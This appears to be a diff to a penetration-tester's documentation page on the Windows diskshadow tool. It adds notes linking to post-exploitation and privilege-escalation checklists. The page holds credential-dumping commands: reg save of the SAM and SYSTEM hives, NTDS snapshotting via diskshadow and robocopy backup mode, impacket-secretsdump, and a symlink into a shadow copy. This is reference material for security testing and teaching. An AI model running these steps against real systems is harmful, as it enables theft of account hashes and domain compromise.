@@ -9,6 +9,34 @@ hideFooterPagination: true
 
 {/* Generated from Commands/diskshadow.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## diskshadow: choose the operation and read the result
+
+Commands and examples collected from your diskshadow notes.
+
+### What the result establishes
+
+Understand the volume, snapshot context and exposed path before interpreting a shadow-copy result.
+
+### Prerequisites and common failures
+
+Creating or exposing snapshots requires the relevant privileges and service support; a snapshot is not automatically a readable credential artifact.
+
+### Example 1: C. SeBackup / SeRestore → read any file
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```cmd
+:: grab SAM + SYSTEM (local account hashes)
+reg save HKLM\SAM  C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+:: on a DC, snapshot NTDS via diskshadow + robocopy /b (backup mode), then:
+:: on Kali:  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your diskshadow notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=diskshadow) · [All tools](/index)
 
 ## C. SeBackup / SeRestore → read any file
@@ -22,6 +50,13 @@ reg save HKLM\SYSTEM C:\Temp\SYSTEM
 :: on a DC, snapshot NTDS via diskshadow + robocopy /b (backup mode), then:
 :: on Kali:  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — C. SeBackup / SeRestore → read any file](/cheatsheets/windows-post-exploitation#c-sebackup-/-serestore-→-read-any-file) · [Impacket: Script Quick Reference — Example 5: C. SeBackup / SeRestore → read any file](/tools/impacket#example-5-c-sebackup-/-serestore-→-read-any-file)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -50,6 +85,22 @@ diskshadow list shadows all
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Abusing Shadow Copies](/privesc/windows-privesc-checklist#eop-abusing-shadow-copies)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Windows Post-Exploitation: Field Reference](/cheatsheets/windows-post-exploitation)
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+
+{/* VAULT_RELATED_END */}
